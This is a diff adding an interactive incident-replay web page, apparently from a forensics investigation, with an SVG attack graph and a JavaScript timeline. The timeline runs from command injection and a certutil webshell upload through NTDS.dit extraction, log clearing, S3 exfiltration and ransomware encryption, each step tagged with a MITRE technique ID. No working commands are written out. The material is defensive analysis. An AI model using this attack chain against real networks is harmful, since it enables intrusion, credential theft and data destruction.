+    <div class="scrubber-phase" style="left:88%"><span>Phase 5</span></div>
+  </div>
+
+  <div class="rp-ctrl">
+    <button class="replay-btn" onclick="replayReset()">⏮ Reset</button>
+    <button class="replay-btn" onclick="replayPrev()">◀ Back</button>
+    <button class="replay-btn primary" id="btn-play" onclick="replayToggle()">▶ Play</button>
+    <button class="replay-btn" onclick="replayNext()">Next ▶</button>
+    <div class="speed-pick">
+      <button onclick="setSpeeds(1)" class="active">1×</button>
+      <button onclick="setSpeeds(10)">10×</button>
+      <button onclick="setSpeeds(60)">60×</button>
+    </div>
+    <span class="ev-counter" id="evCounter">Event 1 of 53</span>
+  </div>
+</div>
+
+<div class="graph-wrap">
+  <svg viewBox="0 0 1200 600" style="width:100%; height:auto; min-height:500px">
+    <defs>
+      <marker id="arrC" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
+        <path d="M0,0 L0,6 L9,3 z" fill="var(--cyan)"/>
+      </marker>
+      <marker id="arrA" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
+        <path d="M0,0 L0,6 L9,3 z" fill="var(--amber)"/>
+      </marker>
+      <marker id="arrR" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
+        <path d="M0,0 L0,6 L9,3 z" fill="var(--red)"/>
+      </marker>
+      <radialGradient id="detonateGradient" cx="50%" cy="50%">
+        <stop offset="0%" style="stop-color:var(--red); stop-opacity:.8"/>
+        <stop offset="100%" style="stop-color:var(--red); stop-opacity:0"/>
+      </radialGradient>
+    </defs>
+
+    <!-- Network zones -->
+    <rect x="20" y="20" width="250" height="560" fill="none" stroke="var(--red)" stroke-dasharray="5 5" opacity="0.3"/>
+    <text x="40" y="45" font-size="11" fill="var(--dim)" font-family="IBM Plex Mono" text-transform="uppercase">INTERNET</text>
+
+    <rect x="300" y="20" width="900" height="560" fill="none" stroke="var(--cyan)" stroke-dasharray="5 5" opacity="0.2"/>
+    <text x="320" y="45" font-size="11" fill="var(--dim)" font-family="IBM Plex Mono">LAF.LOCAL DOMAIN</text>
+
+    <!-- Host nodes -->
+    <g class="host-g entry" id="h-IIS">
+      <rect x="70" y="100" width="160" height="80" rx="4" fill="rgba(88,166,255,.1)" stroke="var(--cyan)" stroke-width="2"/>
+      <text x="90" y="130" font-weight="600" font-size="13" fill="var(--cyan)">IIS-SERV-PROD</text>
+      <text x="90" y="150" font-size="10" fill="var(--muted)" font-family="IBM Plex Mono">198.51.100.10:80</text>
+      <text x="90" y="165" font-size="9" fill="var(--green)">ENTRY</text>
+    </g>
+
+    <g class="host-g piv" id="h-SVR01">
+      <rect x="350" y="80" width="160" height="80" rx="4" fill="rgba(255,184,0,.1)" stroke="var(--amber)" stroke-width="2"/>
+      <text x="370" y="110" font-weight="600" font-size="13" fill="var(--amber)">LAF-SVR01</text>
+      <text x="370" y="130" font-size="10" fill="var(--muted)" font-family="IBM Plex Mono">10.3.10.12</text>
+      <text x="370" y="145" font-size="9" fill="var(--green)">PIVOT</text>
+    </g>
+
+    <g class="host-g dc" id="h-DC01">
+      <rect x="630" y="50" width="160" height="80" rx="4" fill="rgba(255,59,59,.1)" stroke="var(--red)" stroke-width="2"/>
+      <text x="650" y="80" font-weight="600" font-size="13" fill="var(--red)">LAF-DC01</text>
+      <text x="650" y="100" font-size="10" fill="var(--muted)" font-family="IBM Plex Mono">10.3.10.10</text>
+      <text x="650" y="115" font-size="9" fill="var(--green)">DOMAIN CONTROL</text>
+    </g>
+
+    <g class="host-g vict" id="h-WS01">
+      <rect x="350" y="300" width="160" height="80" rx="4" fill="rgba(192,132,252,.1)" stroke="var(--violet)" stroke-width="2"/>
+      <text x="370" y="330" font-weight="600" font-size="13" fill="var(--violet)">LAF-WS01</text>
+      <text x="370" y="350" font-size="10" fill="var(--muted)" font-family="IBM Plex Mono">10.3.10.13 | Donny</text>
+      <text x="370" y="365" font-size="9" fill="var(--green)">VICTIM</text>
+    </g>
+
+    <g class="host-g vict" id="h-WS02">
+      <rect x="630" y="300" width="160" height="80" rx="4" fill="rgba(192,132,252,.1)" stroke="var(--violet)" stroke-width="2"/>
+      <text x="650" y="330" font-weight="600" font-size="13" fill="var(--violet)">LAF-WS02</text>
+      <text x="650" y="350" font-size="10" fill="var(--muted)" font-family="IBM Plex Mono">10.3.10.14 | Dalton</text>
+      <text x="650" y="365" font-size="9" fill="var(--green)">VICTIM</text>
+    </g>
+
+    <g class="host-g cloud" id="h-AWS">
+      <rect x="910" y="100" width="160" height="80" rx="4" fill="rgba(0,255,156,.1)" stroke="var(--green)" stroke-width="2"/>
+      <text x="930" y="130" font-weight="600" font-size="13" fill="var(--green)">AWS S3</text>
+      <text x="930" y="150" font-size="10" fill="var(--muted)" font-family="IBM Plex Mono">464381121764</text>
+      <text x="930" y="165" font-size="9" fill="var(--green)">CLOUD</text>
+    </g>
+
+    <!-- Attack edges (paths) -->
+    <g id="edge-injection" class="edge-g edge-c" opacity="0.4">
+      <path d="M 230 140 Q 280 120, 350 120" stroke="var(--cyan)" stroke-width="2" fill="none" marker-end="url(#arrC)"/>
+      <text x="270" y="105" font-size="10" fill="var(--cyan)" font-family="IBM Plex Mono">OS Command Injection (T1190)</text>
+      <text x="270" y="125" font-size="9" fill="var(--muted)" font-family="IBM Plex Mono">18:40:01 · IIS W3SVC log</text>
+    </g>
+
+    <g id="edge-beacon" class="edge-g edge-a" opacity="0.4">
+      <path d="M 510 120 Q 560 100, 630 110" stroke="var(--amber)" stroke-width="2" fill="none" marker-end="url(#arrA)"/>
+      <text x="545" y="95" font-size="10" fill="var(--amber)" font-family="IBM Plex Mono">C2 Implant (T1190)</text>
+      <text x="545" y="115" font-size="9" fill="var(--muted)" font-family="IBM Plex Mono">19:59:00 · Volatility</text>
+    </g>
+
+    <g id="edge-ntds" class="edge-g edge-r" opacity="0.4">
+      <path d="M 790 100 Q 800 170, 790 240" stroke="var(--red)" stroke-width="2" fill="none" marker-end="url(#arrR)"/>
+      <text x="760" y="170" font-size="10" fill="var(--red)" font-family="IBM Plex Mono">NTDS.dit Dump (T1003.003)</text>
+      <text x="760" y="190" font-size="9" fill="var(--muted)" font-family="IBM Plex Mono">20:09:03 · VSS Extract</text>
+    </g>
+
+    <g id="edge-lateral" class="edge-g edge-a" opacity="0.4">
+      <path d="M 510 180 Q 560 240, 630 280" stroke="var(--amber)" stroke-width="2" fill="none" marker-end="url(#arrA)"/>
+      <text x="540" y="230" font-size="10" fill="var(--amber)" font-family="IBM Plex Mono">Lateral Movement (T1570)</text>
+      <text x="540" y="250" font-size="9" fill="var(--muted)" font-family="IBM Plex Mono">20:16–20:37 · SMB / RDP</text>
+    </g>
+
+    <g id="edge-encrypt" class="edge-g edge-r" opacity="0.4">
+      <path d="M 790 280 Q 850 320, 910 140" stroke="var(--red)" stroke-width="2" fill="none" marker-end="url(#arrR)"/>
+      <text x="840" y="250" font-size="10" fill="var(--red)" font-family="IBM Plex Mono">Ransomware / Data Exfil (T1486)</text>
+      <text x="840" y="270" font-size="9" fill="var(--muted)" font-family="IBM Plex Mono">22:08–22:46 · IamBatman.exe</text>
+    </g>
+
+    <!-- Traveling packet (animates along edges) -->
+    <circle id="replayPacket" r="6" fill="var(--green)" opacity="0" filter="drop-shadow(0 0 8px var(--green))"/>
+
+    <!-- Impact zone overlay (appears at ransomware phase) -->
+    <rect id="impactZone" x="300" y="280" width="900" height="300" fill="rgba(255,59,59,.04)" opacity="0" style="pointer-events:none"/>
+  </svg>
+</div>
+
+<div class="graph-legend">
+  <div class="gl-item"><div class="gl-dot" style="background:var(--cyan); border-color:var(--cyan)"></div> Reconnaissance & Foothold</div>
+  <div class="gl-item"><div class="gl-dot" style="background:var(--amber); border-color:var(--amber)"></div> Lateral Movement & Privesc</div>
+  <div class="gl-item"><div class="gl-dot" style="background:var(--red); border-color:var(--red)"></div> Impact & Destruction</div>
+  <div class="gl-item"><div class="gl-dot" style="background:var(--green); border-color:var(--green)"></div> Cloud Pivot</div>
+</div>
+
+</section>
+<script>
+let currentEventIdx = 0;
+let isPlaying = false;
+let playSpeed = 1;
+let animFrameId = null;
+
+const EVENTS = [
+  { t: '18:38:29', host: 'IIS-SERV-PROD', desc: 'Attacker reconnaissance begins', phase: 'I', ttp: 'T1190', eid: 'IIS log' },
+  { t: '18:40:01', host: 'IIS-SERV-PROD', desc: 'OS command injection: whoami via CheckStatus.aspx', phase: 'I', ttp: 'T1190', eid: 'IIS W3SVC' },
+  { t: '18:51:42', host: 'IIS-SERV-PROD', desc: 'WebShell upload via certutil', phase: 'I', ttp: 'T1105', eid: 'IIS log' },
+  { t: '19:08:42', host: 'IIS-SERV-PROD', desc: 'Webshell POST activation (curl)', phase: 'I', ttp: 'T1505.004', eid: 'IIS log' },
+  { t: '19:38:02', host: 'IIS-SERV-PROD', desc: 'SolarwindsTFTP privesc → SYSTEM', phase: 'I', ttp: 'T1574.009', eid: 'EID 7036' },
+  { t: '19:59:00', host: 'SVR01', desc: 'rnSylwOz.exe C2 beacon launched', phase: 'II', ttp: 'T1569.002', eid: 'Volatility pslist' },
+  { t: '20:02:14', host: 'SVR01', desc: 'serviceaccount Domain Admin created', phase: 'II', ttp: 'T1136.002', eid: 'Sysmon EID 1' },
+  { t: '20:03:05', host: 'DC01', desc: 'serviceaccount added to Domain Admins', phase: 'II', ttp: 'T1098.002', eid: 'EID 4728' },
+  { t: '20:09:03', host: 'DC01', desc: 'NTDS.dit extracted via VSS', phase: 'II', ttp: 'T1003.003', eid: 'MFT DD5' },
+  { t: '20:16:23', host: 'WS01', desc: 'LAFAdmin logon from SVR01', phase: 'III', ttp: 'T1570', eid: 'EID 4624' },
+  { t: '20:35:29', host: 'WS01', desc: 'RED1 interactive RDP as Donny', phase: 'III', ttp: 'T1021.001', eid: 'EID 4624 T10' },
+  { t: '20:37:03', host: 'WS01', desc: 'aws_backup.exe persistence installed', phase: 'III', ttp: 'T1547.001', eid: 'MFT' },
+  { t: '20:46:03', host: 'DC02', desc: 'Advanced IP Scanner downloaded', phase: 'III', ttp: 'T1518', eid: 'MFT' },
+  { t: '21:08:28', host: 'SVR01', desc: 'LogDel.bat event log clearing', phase: 'IV', ttp: 'T1070.001', eid: 'Sysmon EID 1' },
+  { t: '21:42:11', host: 'AWS', desc: 'GetCallerIdentity with stolen EC2 creds', phase: 'IV', ttp: 'T1552.004', eid: 'CloudTrail' },
+  { t: '21:49:16', host: 'AWS', desc: '164× GetObject S3 exfiltration begins', phase: 'IV', ttp: 'T1537', eid: 'CloudTrail' },
+  { t: '22:08:40', host: 'WS02', desc: 'FIRST ENCRYPTION - .bWqQUx ransomware', phase: 'V', ttp: 'T1486', eid: 'MFT' },
+  { t: '22:09:15', host: 'WS01', desc: 'vssadmin delete + IamBatman.exe encrypt', phase: 'V', ttp: 'T1486', eid: 'Sysmon' },
+  { t: '22:10:14', host: 'DC01', desc: 'DC01 encrypted - domain control lost', phase: 'V', ttp: 'T1486', eid: 'MFT' },
+];
+
+function updateEventCard(idx) {
+  if (idx >= EVENTS.length) idx = EVENTS.length - 1;
+  const ev = EVENTS[idx];
+  document.getElementById('ecTime').textContent = ev.t;
+  document.getElementById('ecHost').textContent = ev.host;
+  document.getElementById('ecDesc').textContent = ev.desc;
+  document.getElementById('evCounter').textContent = `Event ${idx + 1} of ${EVENTS.length}`;
+
+  const card = document.getElementById('eventCard');
+  card.className = `event-card act-${ev.phase}`;
+
+  const ttp = document.querySelector('.ec-tag.ttp');
+  const eid = document.querySelector('.ec-tag.eid');
+  if (ttp) ttp.textContent = ev.ttp;
+  if (eid) eid.textContent = ev.eid;
+
+  const pct = (idx / EVENTS.length) * 100;
+  document.getElementById('scrubFill').style.width = pct + '%';
+}
+
+function replayToggle() {
+  isPlaying = !isPlaying;
+  const btn = document.getElementById('btn-play');
+  btn.textContent = isPlaying ? '⏸ Pause' : '▶ Play';
+  if (isPlaying) tick();
+}
+
+function replayReset() {
+  currentEventIdx = 0;
+  isPlaying = false;
+  document.getElementById('btn-play').textContent = '▶ Play';
+  updateEventCard(0);
+  cancelAnimationFrame(animFrameId);
+}
+
+function replayNext() {
+  if (currentEventIdx < EVENTS.length - 1) {
+    currentEventIdx++;
+    updateEventCard(currentEventIdx);
+  }
+}
+
+function replayPrev() {
+  if (currentEventIdx > 0) {
+    currentEventIdx--;
+    updateEventCard(currentEventIdx);
+  }
+}
+
+function setSpeeds(s) {
+  playSpeed = s;
+  document.querySelectorAll('.speed-pick button').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+}
+
+function tick() {
+  if (isPlaying && currentEventIdx < EVENTS.length - 1) {
+    currentEventIdx += playSpeed / 60;
+    updateEventCard(Math.floor(currentEventIdx));
+    animFrameId = requestAnimationFrame(tick);
+  }
+}
+
+document.getElementById('scrubber').addEventListener('click', (e) => {
+  const rect = e.currentTarget.getBoundingClientRect();
+  const pct = (e.clientX - rect.left) / rect.width;
+  currentEventIdx = Math.floor(pct * EVENTS.length);
+  updateEventCard(currentEventIdx);
+  isPlaying = false;
+  document.getElementById('btn-play').textContent = '▶ Play';
+});
+
+// Initialize
+updateEventCard(0);
+</script>
+</body></html>
